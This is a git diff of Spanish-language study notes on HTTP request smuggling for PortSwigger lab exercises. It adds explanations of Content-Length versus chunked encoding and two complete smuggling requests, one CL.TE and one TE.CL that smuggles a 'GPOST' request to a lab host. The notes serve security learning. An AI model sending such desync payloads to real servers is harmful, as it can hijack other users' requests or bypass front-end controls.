@@ -22,7 +22,7 @@ q=smuggling
 
 ```
 
-### ***En este ejemplo vale la pena recalcar que Content-Length manda la informacion en bytes y que en formato hex cada caracter equivale a 4 bits y cada caracter se forma por lo regular de 2 numeros hex por ejemplo 2e (el punto) entonces cada caracter ascii equivaldria a un byte****
+### ***En este ejemplo vale la pena recalcar que Content-Length manda la informacion en bytes y que en formato hex cada caracter equivale a 4 bits y cada caracter se forma por lo regular de 2 numeros hex por ejemplo 2e (el punto) entonces cada caracter ascii equivaldria a un byte***
 
 
 
@@ -39,6 +39,11 @@ q=smuggling
 0
 
 ```
+
+### En este caso recordar que la cabecera Transfer-Encoding pasa datos de la siguiente maneja en salto de linea despues el valor en hex del tamaño de datos a pasar  + salto de linea +
+despues los datos en si ( b es 11 en hex) y al final ya cuando no se enviaran mas datos pone un 0 y el salto de linea y asi se acaba.
+
+
 # Casos que se pueden encontrar 
 
 Recordar para que sirven esta headers *** Two different methods for specifying the length of HTTP messages****  Content-Length y Transfer-Encoding header (chunked encoding).
@@ -64,7 +69,47 @@ Para trabajar con esta vulnerabilidad te recomiendan utilizar esta extencion de 
 
 Para este lab tenemos que el front end acepta Content-Lenght y el servidor acepta Trasfer-Encoding 
 
+```
 
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+
+```
+# HTTP request smuggling, basic TE.CL vulnerability
+
+Para este laboratiorio el fron en acepta el header  Transfer-Encoding y el back-end el Content-Lenght.
+
+```
+POST / HTTP/1.1
+Host: 0a4c00f00330561dc002744700960007.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+
+```
+
+Recuerda que los salto de liena son dos caracteres por eso es 4 y en el caso del final son 4 caracteres \r\n\r\n. 
 Referencias 
 
 > https://portswigger.net/web-security/request-smuggling
